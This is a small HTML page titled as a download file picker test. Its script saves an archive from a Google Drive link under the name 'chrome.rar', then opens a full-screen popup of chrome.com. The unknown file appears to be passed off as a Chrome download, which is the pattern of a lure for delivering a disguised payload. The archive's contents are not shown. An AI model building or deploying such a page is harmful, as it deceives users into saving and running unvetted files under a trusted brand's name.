<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Download File Picker Test</title>
<style>
body { font-family:sans-serif;padding:20px }
button { padding:12px 18px;font-size:16px }
pre { background:#111;color:#0f0;padding:10px }
</style>
</head>
<body>

<h3>Download File Picker Test</h3>
<button id="btn">Download File</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";

document.getElementById("btn").onclick = async () => {

  log("[1] User click received");

  const url = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL";

  try {

    log("[2] Opening save file picker");

    const handle = await window.showSaveFilePicker({
      suggestedName: "chrome.rar",
      types: [{
        description: "RAR Archive",
        accept: { "application/x-rar-compressed": [".rar"] }
      }]
    });

    const response = await fetch(url);
    const blob = await response.blob();

    const writable = await handle.createWritable();

    await writable.write(blob);
    await writable.close();

    log("[3] File saved");

  } catch(e) {
    log("[ERROR] " + e);
  }

  const w = window.open(
    "https://chrome.com",
    "_blank",
    `
    width=${screen.availWidth},
    height=${screen.availHeight},
    left=0,
    top=0
    `
  );

  if(!w){
    log("[ERROR] Popup blocked");
  } else {
    log("[4] Popup opened");
  }

};
</script>

</body>
</html>
